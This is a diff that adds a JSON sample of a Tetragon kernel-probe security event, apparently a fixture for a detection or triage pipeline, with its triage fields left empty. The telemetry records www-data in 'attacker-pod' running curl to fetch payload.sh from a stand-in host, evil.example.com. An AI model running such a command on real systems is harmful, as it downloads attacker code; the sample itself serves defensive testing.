@@ -1,0 +1,37 @@
+{
+    "event_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "timestamp": "2026-03-06T07:30:00.000Z",
+    "source": "tetragon",
+    "event_type": "process_kprobe",
+    "node_name": "kind-worker",
+    "telemetry": {
+        "pid": 4821,
+        "binary": "/usr/bin/curl",
+        "args": [
+            "-k",
+            "http://evil.example.com/payload.sh"
+        ],
+        "uid": 33,
+        "user": "www-data",
+        "cwd": "/tmp",
+        "namespace": "default",
+        "pod": "attacker-pod",
+        "container_id": "abc123def456",
+        "parent_binary": "/bin/bash",
+        "parent_pid": 4800,
+        "kprobe": {
+            "function": "__x64_sys_execve",
+            "policy": "sentinel-full",
+            "action": "KPROBE_ACTION_POST",
+            "args": [
+                {
+                    "string_arg": "/usr/bin/curl"
+                }
+            ],
+            "return_value": null
+        }
+    },
+    "triage": null,
+    "explanation": null,
+    "remediation": null
+}
